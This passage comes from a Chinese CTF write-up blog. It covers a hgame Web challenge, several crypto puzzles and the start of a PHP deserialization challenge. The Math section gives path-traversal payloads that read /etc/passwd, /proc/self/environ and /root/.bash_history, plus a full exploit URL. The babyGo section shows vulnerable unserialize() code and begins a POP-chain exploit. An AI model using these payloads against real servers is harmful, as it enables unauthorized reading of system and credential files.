title="Math有趣"></a>Math有趣</h3><p>通过第一关以后发现第二关的题目是一张图片，查看图片地址发现地址为：<code>cXVlc3Rpb24ucG5n.php</code>，base64解码以后发现为<code>question.png</code>，想到任意文件读取漏洞，尝试<code>../../../../../etc/passwd.php</code>（base64以后），发现可以成功读取：</p><p><a href="https://imgchr.com/i/kH53Xd" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kH53Xd.md.png" alt="kH53Xd.md.png"></a></p><p><strong><em>hint：了解一下tomcat、spring mvc的目录结构和配置文件(自己搭一下就明白了</em></strong></p><p><strong>solution1：</strong>既然可以读取，于是尝试<code>../../../../../proc/self/environ</code>，成功读取，下载下来16进制转码得到有用的路径：</p><p><a href="https://imgchr.com/i/kHIVgg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kHIVgg.md.png" alt="kHIVgg.md.png"></a></p><p><strong>solution2：</strong>还有一种方法就是读取<code>/root/.bash_history</code>查看命令历史：</p><p>进入tomcat：</p><p><img src="https://s2.ax1x.com/2019/03/01/kHIzGT.png" alt="kHIzGT.png"></p><p>工作目录：</p><p><img src="https://s2.ax1x.com/2019/03/01/kHIOZn.png" alt="kHIOZn.png"></p><p>到现在为止定位到：<code>usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller</code></p><p>试一下随便读取<code>1.php</code>，发现报错，发现了关键信息:</p><p><a href="https://imgchr.com/i/kHo1eA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kHo1eA.md.png" alt="kHo1eA.md.png"></a></p><p>所以读取路径最后为：<code>../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class</code></p><p><strong>payload:</strong><code>http://test.tan90.me:8080/img/Li4vLi4vLi4vLi4vLi4vdXNyL2xvY2FsL3RvbWNhdC93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2hnYW1lL2NvbnRyb2xsZXIvTWF0aENvbnRyb2xsZXIuY2xhc3M=</code></p><p>读取到改为后缀为class文件以后，进行反编译为java文件，得到源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hgame.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.ModelMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@org</span>.springframework.stereotype.Controller</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MathController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">MathController</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/index"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(ModelMap model, HttpSession session, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Object step = session.getAttribute(<span class="string">"step"</span>);</span><br><span class="line">    <span class="keyword">if</span> (step == <span class="keyword">null</span>) &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, Character.valueOf(<span class="string">'1'</span>));</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (step.toString().equals(<span class="string">"1"</span>)) &#123;</span><br><span class="line">      model.addAttribute(<span class="string">"message"</span>, <span class="string">"Welcome to the world of mathematics.&lt;br/&gt;Let's warm up first.&lt;br/&gt;1+1=?"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (step.toString().equals(<span class="string">"2"</span>)) &#123;</span><br><span class="line">      model.addAttribute(<span class="string">"message"</span>, <span class="string">"It seems that you have learned it, let us do a difficult question.&lt;br/&gt;&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt;&lt;br/&gt;Show me the smallest integer solutions."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"math"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/index"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pindex</span><span class="params">(@org.springframework.web.bind.annotation.RequestParam(<span class="string">"answer"</span>)</span> String answer, HttpSession session, HttpServletResponse response) <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Object step = session.getAttribute(<span class="string">"step"</span>);</span><br><span class="line">    <span class="keyword">if</span> (step == <span class="keyword">null</span>) &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, Character.valueOf(<span class="string">'1'</span>));</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((step.toString().equals(<span class="string">"1"</span>)) &amp;&amp; </span><br><span class="line">      (answer.equals(<span class="string">"2"</span>))) &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, <span class="string">"2"</span>);</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/img/&#123;path&#125;"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">image</span><span class="params">(@org.springframework.web.bind.annotation.PathVariable(<span class="string">"path"</span>)</span> String path, HttpServletResponse response)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    path = <span class="keyword">new</span> String(java.util.Base64.getDecoder().decode(path));</span><br><span class="line">    InputStream f = <span class="keyword">null</span>;</span><br><span class="line">    OutputStream out = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      f = <span class="keyword">new</span> java.io.FileInputStream(<span class="string">"/home/static/"</span> + path);</span><br><span class="line">      out = response.getOutputStream();</span><br><span class="line">      <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="string">' '</span>];</span><br><span class="line">      <span class="keyword">while</span> ((count = f.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        out.write(buffer, <span class="number">0</span>, count);</span><br><span class="line">        out.flush();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      f.close();</span><br><span class="line">      out.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"ok"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/flag"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现关键函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>123852^x % 612799081 = 6181254136845 % 612799081</code>， <code>^</code>为乘方，这是又考察我数论的知识啊…一想到信安数学基础就头皮发麻…直接爆破吧，就是要耗时长一点：<br>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> pow(<span class="number">123852</span>,i,<span class="number">612799081</span>) == (<span class="number">6181254136845</span> % <span class="number">612799081</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="https://s2.ax1x.com/2019/03/01/kHbCfx.png" alt="kHbCfx.png"></p><p><strong><em>java在线反编译链接：<a href="http://www.javadecompilers.com" target="_blank" rel="noopener">http://www.javadecompilers.com</a></em></strong></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="浪漫足球圣地"><a href="#浪漫足球圣地" class="headerlink" title="浪漫足球圣地"></a>浪漫足球圣地</h3><p>百度一下浪漫足球圣地，得到是曼彻斯特，也就是暗示为曼彻斯特编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">966A969596A9965996999565A5A59696A5A6A59A9699A599A596A595A599A569A5A99699A56996A596A696A996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559</span><br></pre></td></tr></table></figure><p>先转换为2进制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>按照<a href="https://www.ezloo.com/2008/05/manchester_encoding.html" target="_blank" rel="noopener">曼彻斯特编码标准</a>进行转码：<code>&#39;10&#39;-&gt;&#39;0&#39;       &#39;01&#39;-&gt;&#39;1&#39;</code>替换以后正常解码即可；</p><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">s=<span class="string">"966A969596A9965996999565A5A59696A5A6A59A9699A599A596A595A599A569A5A99699A56996A596A696A996A6A5A696A9A595969AA5A69696A5A99696A595A59AA56A96A9A5A9969AA59A9559"</span></span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    res+=<span class="string">'&#123;:04b&#125;'</span>.format(int(i,<span class="number">16</span>))</span><br><span class="line"><span class="comment"># print res</span></span><br><span class="line">fin=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(res),<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> res[j:j+<span class="number">2</span>]==<span class="string">'10'</span>:</span><br><span class="line">        fin+=<span class="string">'0'</span></span><br><span class="line">    <span class="keyword">elif</span> res[j:j+<span class="number">2</span>]==<span class="string">'01'</span>:</span><br><span class="line">        fin+=<span class="string">'1'</span></span><br><span class="line"><span class="comment"># print fin</span></span><br><span class="line">flag=int(fin,<span class="number">2</span>)</span><br><span class="line"><span class="comment"># print flag</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'&#123;:x&#125;'</span>.format(flag).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3f24e567591e9cbab2a7d2f1f748a1d4&#125;</span><br></pre></td></tr></table></figure><h3 id="hill"><a href="#hill" class="headerlink" title="hill"></a>hill</h3><blockquote><p>Description<br>hill密码，秘钥是3x3矩阵，flag的密文是TCSHXZTCXAPBDKJVJDOHJEAE，flag中含有BABYSHILL，flag是有意义的英文，最终提交格式: hgame{有意义的英文} hint1: <a href="https://en.wikipedia.org/wiki/Hill_cipher" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Hill_cipher</a> hint2: 模逆元</p></blockquote><p>未完待续……</p><h3 id="Vigener"><a href="#Vigener" class="headerlink" title="Vigener~"></a>Vigener~</h3><blockquote><p>cipher:<br>Zbi Namyrwjk wmhzk cw s eknlgv uz ifuxstlata edhnufwlow xwpz vc mkohk s kklmwk uz mflklagnkh Gswyuv uavbijk, huwwv uh xzw ryxlwxm sx s qycogxx. Ml ay u jgjs ij hgrsedhnufwlow wmtynmlmzcsf. Lny gahnyv ak kuwq lu orvwxmxsfj urv asjpwekhx, tmz cx jwycwlwj upd szniehzm xg txyec az zsj lnliw ukhxmjoyw, ozowl wsxhiv az nlw vkmgjavnmgf ry gzalzvw atxiuzozjjshfi. Ests twgvfi zsby xjakx xg asjpwekhx wfilchloir kunyqwk zbel sxy ikkkhxasrfc Namyrwjk wmhzklw. Af kckzlkyr kadnc lzxyi, Xjoyhjaib Oskomoa ogm xzw lcvkl zi tmtrcwz s myrwjgf qwlnih gx jygahnyvafm Pmywtyvw uojlwjy. Nlw Noaifwxy gahnyv osy ivayohedde xikuxcfwv hs Kagbur Tsznmklg Viddgms af ncw gfk nlgmyurv xopi zmtxvwv ghh xalnc-gfk vsgc Ru gaxxu hwd. Yck. Yaupef Tgnxakzu Fwdruwg, tan xzw ywlwek qek dgnij eomellxcfmlkx xg Trumkw jy Zaykhijw oh xzw tcrwln wiflalc sfj ms suwomjwj cxk hxywwfz heew. lfey ay ajqmenycpglmqqjzndhrqwpvhtaniz</p><p>key: guess</p></blockquote><p>在线解密即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The Vigenere ciphe is a method of encrypting alphabetic text by using a series of interwoven Caesar ciphers, based on the letters of a keyword. It is a form of polyalphabetic substitution. The cipher is easy to understand and implement, but it resisted all attempts to break it for three centuries, which earned it the description le chiffre indechiffrable. Many people have tried to implement encryption schemes that are essentially Vigenere ciphers. In eighteen sixty three, Friedrich Kasiski was the first to publish a general method of deciphering Vigenere ciphers. The Vigenere cipher was originally described by Giovan Battista Bellaso in his one thousand five hundred and fifty-one book La cifra del. Sig. Giovan Battista Bellaso, but the scheme was later misattributed to Blaise de Vigenere in the nineth century and so acquired its present name. flag is gfyuytukxariyydfjlplwsxdbzwvqt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;gfyuytukxariyydfjlplwsxdbzwvqt&#125;</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>从寒假开了坑，想好好研究一下hgame，一直也没完成，到现在做完两个week也收获到了许多知识（week3，week4就看神仙打架啦，还是萌新，慢慢进步吧），也算是新学期的一点新动力了，纪念第一次hgame，立下flag，下一年继续！！！考研加油！！！</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;平台比赛在2月24号就结束了，只能复现一下，千言万语汇成一句话：爬虫题牛X！！！
    
    </summary>
    
      <category term="Writeup" scheme="https://gardenia30.top/categories/Writeup/"/>
    
    
      <category term="Writeup" scheme="https://gardenia30.top/tags/Writeup/"/>
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Crypto" scheme="https://gardenia30.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>2019安恒杯1月月赛复现</title>
    <link href="https://gardenia30.top/2019/02/23/2019%E5%AE%89%E6%81%92%E6%9D%AF1%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <id>https://gardenia30.top/2019/02/23/2019安恒杯1月月赛复现/</id>
    <published>2019-02-23T08:06:07.000Z</published>
    <updated>2019-03-03T08:01:03.364Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>未完待续…<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h3><p>考察的知识点：</p><ol><li>PHP反序列化；</li><li>POP链的构造；</li></ol><p>此题给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>包含<code>flag.php</code>，那就是要读取其中的内容即可；发现了<code>unserialize()</code>，又是和php反序列化联系起来，由于还是萌新，所以还只是简单了解反序列化的东西，也就是知道几个魔术方法，从飘零学长的博客了解到是关于pop链的构造，对于pop链的构造一无所知，第一次使用，记录一下； </p><blockquote><p>以前理解的序列化攻击更多的是在魔术方法中出现一些利用的漏洞，因为自动调用从而触发漏洞。但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p></blockquote><p>问题具体分析：</p><ol><li>baby类三个变量：<code>skyobj,aaa,bbb</code>，两个魔术方法：<code>__construct(),__toString()</code>，反序列化时会自动调用；</li><li>其中<code>__construct()</code>定义<code>skyobj</code>是<code>sec类</code>的一个对象，sec类中会调用<code>read()</code>方法；</li><li>其中<code>__toString()</code>调用<code>skyobj</code>的<code>read()</code>方法；</li><li><code>cool</code>类中也是由<code>read()</code>方法的；</li></ol><p>关键代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</span><br><span class="line">&#123;</span><br><span class="line">    $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;        </span><br><span class="line">    if (file_get_contents($file))         </span><br><span class="line">    &#123;              </span><br><span class="line">    return file_get_contents($file); </span><br><span class="line">    &#125;  </span><br><span class="line">    else </span><br><span class="line">    &#123; </span><br><span class="line">    return &quot;you must be joking!&quot;; </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常明显是满足<code>$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb</code>即可以读出文件内容，如果构造一个data，使得反序列化后自动调用魔术方法后，通过<code>if判断</code>语句，改变可控变量<code>$filename</code>即可读取到文件内容；</p><p><strong>solution1</strong></p><p>到这里思路就非常明显了：</p><ol><li>从调用<code>sec</code>的<code>read</code>方法改变为调用<code>cool</code>的<code>read</code>方法；</li><li>无需设置$amzing的值，即为NULL，则反序列化后的<code>$this-&gt;nice-&gt;aaa</code>和<code>$this-&gt;nice-&gt;bbb</code>都为NULL，即可成功通过if判断语句；</li></ol><p>构造exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;             <span class="comment">//skyobj为cool的一个对象</span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span 